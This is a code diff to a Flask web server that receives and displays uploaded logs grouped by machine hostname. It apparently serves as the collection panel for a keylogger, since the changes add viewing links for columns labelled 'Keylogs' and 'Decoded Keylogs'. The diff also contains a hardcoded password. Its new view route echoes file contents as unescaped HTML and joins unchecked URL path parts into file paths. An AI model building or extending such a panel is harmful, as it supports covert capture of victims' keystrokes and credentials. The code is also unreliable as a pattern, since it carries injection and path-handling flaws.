@@ -1,5 +1,5 @@
 import os
-from flask import Flask, request, send_from_directory, render_template_string
+from flask import Flask, request, send_from_directory, render_template_string, abort
 from werkzeug.utils import secure_filename
 from datetime import datetime
 import pytz
@@ -7,7 +7,7 @@ import pytz
 UPLOAD_ROOT = "logs"
 PASSWORD = "disha456"
 
-app = Flask(__name__) 
+app = Flask(__name__)
 os.makedirs(UPLOAD_ROOT, exist_ok=True)
 
 COLUMNS = [
@@ -51,8 +51,16 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for file in folder.files %}
-            <td>{% if file %}<a href="{{ file }}">📅 View/Download</a>{% else %}-{% endif %}</td>
+          {% for i, file in enumerate(folder.files) %}
+            <td>
+              {% if file %}
+                {% if i == 3 or i == 4 %} <!-- Keylogs or Decoded Keylogs -->
+                  <a href="{{ file.replace('/download', '/view') }}" target="_blank">📄 View</a>
+                {% else %}
+                  <a href="{{ file }}" target="_blank">📥 View/Download</a>
+                {% endif %}
+              {% else %}-{% endif %}
+            </td>
           {% endfor %}
         </tr>
       {% endfor %}
@@ -134,7 +142,19 @@ def receive():
 
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
-    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
+    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename, as_attachment=True)
+
+@app.route("/view/<folder>/<filename>")
+def view_text(folder, filename):
+    path = os.path.join(UPLOAD_ROOT, folder, filename)
+    if not os.path.exists(path):
+        return abort(404)
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            content = f.read()
+        return f"<pre style='background:black; color:lime; font-family:monospace; padding:20px;'>{content}</pre>"
+    except:
+        return abort(500)
 
 if __name__ == "__main__":
     app.run(debug=True)
